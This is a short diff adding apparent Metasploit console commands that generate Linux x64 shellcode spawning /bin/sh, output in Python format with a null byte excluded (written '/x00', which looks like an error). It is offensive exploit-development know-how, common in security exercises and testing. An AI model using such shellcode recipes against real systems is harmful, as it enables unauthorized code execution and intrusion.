@@ -1,0 +1,5 @@
+# get shellcode
+show payloads
+use linux/x64/exec
+set cmd /bin/sh
+generate -f py -b '/x00'
